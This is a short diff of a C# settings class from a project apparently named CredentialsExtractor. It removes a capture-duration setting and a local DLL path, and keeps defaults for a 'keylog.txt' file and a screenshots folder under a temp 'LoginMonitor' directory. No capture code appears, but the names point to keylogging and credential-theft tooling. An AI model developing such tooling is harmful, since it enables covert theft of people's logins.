@@ -12,16 +12,12 @@ namespace CredentialsExtractor.Configuration
         // Application settings
         public string LogFilePath { get; set; }
         public string ScreenshotDirectory { get; set; }
-        public TimeSpan MaxCaptureDuration { get; set; }
-        public string LoginDetectorDllPath { get; set; }
 
         // Default constructor with sensible defaults
         public AppConfig()
         {
             LogFilePath = Path.Combine(Path.GetTempPath(), "LoginMonitor", "keylog.txt");
             ScreenshotDirectory = Path.Combine(Path.GetTempPath(), "LoginMonitor", "Screenshots");
-            MaxCaptureDuration = TimeSpan.FromMinutes(60); // Default to 1 hour
-            LoginDetectorDllPath = @"M:\Dev\C\Microsoft Visual Studio\CyberProject\x64\Release\LoginDetectorDLL.dll";
         }
     }
 
